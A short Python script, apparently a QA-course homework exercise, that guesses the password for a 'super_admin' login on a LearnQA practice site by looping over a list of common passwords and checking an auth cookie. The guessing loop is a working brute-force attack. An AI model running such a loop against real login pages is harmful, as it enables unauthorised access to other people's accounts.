import requests

login = "super_admin"

passw = ["password",	"123456",	"123456789", "12345678", "12345",	"qwerty", "abc123",	"football",	"1234567", "monkey",
"111111", "letmein", "1234", "1234567890", "dragon",	"baseball",	"sunshine",	"iloveyou", "trustno1", "princess",
"adobe123",	"123123", "welcome",	"login",	"admin",	"qwerty123", "solo",	"1q2w3e4r",
"master",	"666666",	"photoshop",	"1qaz2wsx",	"qwertyuiop",
"ashley", "1234",	"mustang",	"121212"	"starwars",	"654321", "bailey",	"access", "flower",	"555555", "passw0rd",
"shadow", "lovely", "sunshine", "7777777", "michael",	"!@#$%^&*",	"jesus",	"password1",	"superman",	"hello",
"charlie",	"888888", "696969",	"qwertyuiop",	"hottie",	"freedom",	"aa123456",	"gazwsx",	"ninja",	"azerty",
"loveme",	"whatever",	"donald",	"batman",	"zaq1zaq1",	"qazwsx",	"Football",	"000000",	"starwars",	"123qwe"]


for v in passw:

    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login" : f"{login}", "password" : f"{v}"})

    cook = response1.cookies


    response2 = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cook)
    if response2.text != "You are NOT authorized":
        print(f'Верный пароль: {v}, ' + response2.text)



